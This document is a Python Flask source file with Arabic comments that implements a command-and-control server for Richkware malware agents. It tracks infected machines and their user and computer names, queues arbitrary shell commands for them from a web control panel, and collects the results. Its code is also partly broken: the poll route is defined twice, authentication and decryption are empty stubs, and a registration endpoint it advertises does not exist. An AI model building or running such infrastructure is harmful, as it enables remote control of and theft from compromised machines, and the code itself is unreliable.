# c2_server.py - سيرفر متوافق مع Richkware

from flask import Flask, request, jsonify, render_template_string
import time
import json
import base64
from datetime import datetime
import hashlib
import hmac

app = Flask(__name__)

# ==================== إعدادات Richkware ====================
# Richkware يتوقع تواصل مشفر بمفتاح معين
ENCRYPTION_KEY = "7Fd3#9Lk2$mP5@nQ8!rT4&yU6*zX1"  # نفس اللي في agent.hpp

# تخزين البيانات
agents = {}  # الأجهزة المسجلة
pending_commands = {}  # الأوامر المنتظرة لكل جهاز
results = {}  # النتائج المرسلة من الأجهزة

# ==================== الوظائف المساعدة ====================
def verify_auth(auth_header):
    """Richkware يستخدم HMAC للتوقيع"""
    # هنا منطق التحقق من صحة الطلب
    return True

def decrypt_data(encrypted_data):
    """فك تشفير البيانات (Richkware يستخدم AES)"""
    # في الحقيقة هنا فك تشفير AES
    return encrypted_data

def encrypt_data(data):
    """تشفير البيانات للرد"""
    return data

# ==================== نقطة النهاية اللي Richkware يتصل بها ====================
@app.route('/api/v1/agent/poll', methods=['POST'])
def poll_commands():
    try:
        # طباعة كل ما يصلنا لنفهمه
        print(f"\n[!] Incoming Poll from: {request.remote_addr}")
        
        # محاولة قراءة البيانات حتى لو لم تكن JSON
        raw_data = request.get_data()
        print(f"[*] Raw Data received: {raw_data}")

        # استخراج agent_id بطريقة مرنة
        data = request.get_json(silent=True) or {}
        agent_id = data.get('agent_id', 'unknown_agent')

        # تحديث بيانات الجهاز
        agents[agent_id] = {
            'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'ip': request.remote_addr,
            'status': 'Online'
        }

        # الرد الافتراضي (Richkware يتوقع JSON)
        return jsonify({
            'has_command': False,
            'server_time': datetime.now().isoformat()
        }), 200

    except Exception as e:
        print(f"[-] Error in Poll: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/v1/agent/poll', methods=['POST'])
def poll_commands():
    """الوكيل يسأل: في أوامر جديده؟"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        
        if not agent_id:
            return jsonify({'error': 'No agent_id'}), 400
        
        # تحديث آخر ظهور
        if agent_id in agents:
            agents[agent_id]['last_seen'] = datetime.now().isoformat()
        else:
            # وكيل جديد يسأل قبل ما يسجل؟ سجله تلقائياً
            agents[agent_id] = {
                'first_seen': datetime.now().isoformat(),
                'last_seen': datetime.now().isoformat(),
                'system_info': data.get('system_info', {}),
                'ip': request.remote_addr
            }
        
        # شوف إذا في أوامر معلقة لهذا الوكيل
        if agent_id in pending_commands and pending_commands[agent_id]:
            # خذ أول أمر
            command = pending_commands[agent_id].pop(0)
            response = {
                'has_command': True,
                'command_id': command['id'],
                'command': command['cmd'],
                'args': command.get('args', [])
            }
        else:
            response = {
                'has_command': False
            }
        
        return jsonify(response), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/v1/agent/result', methods=['POST'])
def submit_result():
    """الوكيل يرسل نتيجة تنفيذ الأمر"""
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        command_id = data.get('command_id')
        output = data.get('output')
        status = data.get('status', 'success')
        
        # خزن النتيجة
        key = f"{agent_id}_{command_id}"
        results[key] = {
            'agent_id': agent_id,
            'command_id': command_id,
            'output': output,
            'status': status,
            'time': datetime.now().isoformat()
        }
        
        return jsonify({'status': 'received'}), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ==================== واجهة التحكم بتاعتك ====================
@app.route('/')
def index():
    """الصفحة الرئيسية - عرض كل الأجهزة"""
    html = """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>C2 Control Panel</title>
        <style>
            body { font-family: Arial; background: #0a0a0a; color: #fff; margin: 0; padding: 20px; }
            .container { max-width: 1400px; margin: auto; }
            .header { background: #1a1a1a; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
            .agents-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
            .agent-card { background: #1e1e1e; border-radius: 10px; padding: 15px; border-left: 4px solid #00ff00; }
            .agent-card.online { border-left-color: #00ff00; }
            .agent-card.offline { border-left-color: #ff0000; opacity: 0.7; }
            .agent-header { display: flex; justify-content: space-between; align-items: center; }
            .agent-id { font-family: monospace; color: #00ff00; }
            .last-seen { color: #888; font-size: 0.8em; }
            .system-info { background: #2a2a2a; padding: 10px; border-radius: 5px; margin: 10px 0; font-size: 0.9em; }
            .command-form { margin-top: 15px; }
            .command-input { width: 70%; padding: 8px; background: #333; border: 1px solid #444; color: white; border-radius: 3px; }
            .send-btn { padding: 8px 15px; background: #007bff; color: white; border: none; cursor: pointer; border-radius: 3px; }
            .send-btn:hover { background: #0056b3; }
            .results { margin-top: 10px; max-height: 200px; overflow-y: auto; background: #0f0f0f; padding: 8px; border-radius: 3px; }
            .result-item { border-bottom: 1px solid #333; padding: 5px; font-family: monospace; font-size: 0.8em; }
            .stats { background: #1a1a1a; padding: 15px; border-radius: 10px; margin-top: 20px; }
            .nav-links { display: flex; gap: 10px; margin-bottom: 20px; }
            .nav-links a { color: cyan; text-decoration: none; padding: 8px 15px; background: #333; border-radius: 5px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🎮 C2 Command & Control - لوحة التحكم</h1>
                <p>الأجهزة المتصلة: {{ agents|length }}</p>
            </div>
            
            <div class="nav-links">
                <a href="/">🏠 الرئيسية</a>
                <a href="/commands">📋 الأوامر</a>
                <a href="/results">📊 النتائج</a>
            </div>
            
            <div class="agents-grid">
                {% for agent_id, info in agents.items() %}
                <div class="agent-card online" id="agent-{{ agent_id }}">
                    <div class="agent-header">
                        <span class="agent-id">{{ agent_id[:8] }}...</span>
                        <span class="last-seen">{{ info.last_seen }}</span>
                    </div>
                    
                    <div class="system-info">
                        <div>💻 {{ info.system_info.get('computer_name', 'N/A') }}</div>
                        <div>👤 {{ info.system_info.get('user_name', 'N/A') }}</div>
                        <div>🌐 {{ info.ip }}</div>
                        <div>🕒 أول ظهور: {{ info.first_seen }}</div>
                    </div>
                    
                    <div class="command-form">
                        <form onsubmit="sendCommand('{{ agent_id }}', event)">
                            <input type="text" class="command-input" placeholder="اكتب الأمر (مثل: whoami)" required>
                            <button type="submit" class="send-btn">إرسال</button>
                        </form>
                    </div>
                    
                    <div class="results" id="results-{{ agent_id }}">
                        <div style="color:#888;">نتائج الأوامر...</div>
                    </div>
                </div>
                {% endfor %}
            </div>
            
            <div class="stats">
                <h3>📊 إحصائيات</h3>
                <p>إجمالي الأجهزة: {{ agents|length }}</p>
                <p>الأوامر المعلقة: {{ pending_count }}</p>
                <p>النتائج المستلمة: {{ results_count }}</p>
            </div>
        </div>
        
        <script>
            function sendCommand(agentId, event) {
                event.preventDefault();
                const input = event.target.querySelector('.command-input');
                const cmd = input.value;
                
                fetch('/send-command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({agent_id: agentId, command: cmd})
                })
                .then(r => r.json())
                .then(data => {
                    input.value = '';
                    alert('تم إرسال الأمر بنجاح');
                })
                .catch(err => alert('فشل الإرسال: ' + err));
            }
            
            // تحديث الصفحة كل 10 ثواني
            setInterval(() => {
                location.reload();
            }, 10000);
        </script>
    </body>
    </html>
    """
    
    # الإحصائيات
    pending_count = sum(len(cmds) for cmds in pending_commands.values())
    
    return render_template_string(html, 
                                  agents=agents, 
                                  pending_count=pending_count,
                                  results_count=len(results))

@app.route('/send-command', methods=['POST'])
def send_command():
    """إرسال أمر لجهاز معين"""
    data = request.get_json()
    agent_id = data.get('agent_id')
    command = data.get('command')
    
    if not agent_id or not command:
        return jsonify({'error': 'Missing data'}), 400
    
    # أضف الأمر لقائمة الانتظار
    if agent_id not in pending_commands:
        pending_commands[agent_id] = []
    
    command_id = hashlib.md5(f"{agent_id}{command}{time.time()}".encode()).hexdigest()
    
    pending_commands[agent_id].append({
        'id': command_id,
        'cmd': command,
        'args': [],
        'time': datetime.now().isoformat()
    })
    
    return jsonify({'status': 'queued', 'command_id': command_id}), 200

@app.route('/results')
def view_results():
    """عرض كل النتائج"""
    results_list = []
    for key, result in results.items():
        results_list.append(result)
    
    return jsonify(results_list)

@app.route('/commands')
def view_commands():
    """عرض الأوامر المعلقة"""
    return jsonify(pending_commands)

# ==================== تشغيل السيرفر ====================
if __name__ == '__main__':
    print("\n" + "="*50)
    print("🚀 C2 Server - متوافق مع Richkware")
    print("="*50)
    print(f"📡 نقاط النهاية:")
    print(f"   POST /api/v1/agent/register  - تسجيل وكيل جديد")
    print(f"   POST /api/v1/agent/poll      - استعلام الأوامر")
    print(f"   POST /api/v1/agent/result    - استقبال النتائج")
    print(f"   GET  /                        - لوحة التحكم")
    print(f"   POST /send-command            - إرسال أمر")
    print("="*50 + "\n")
    
    app.run(host='0.0.0.0', port=8080, debug=True)
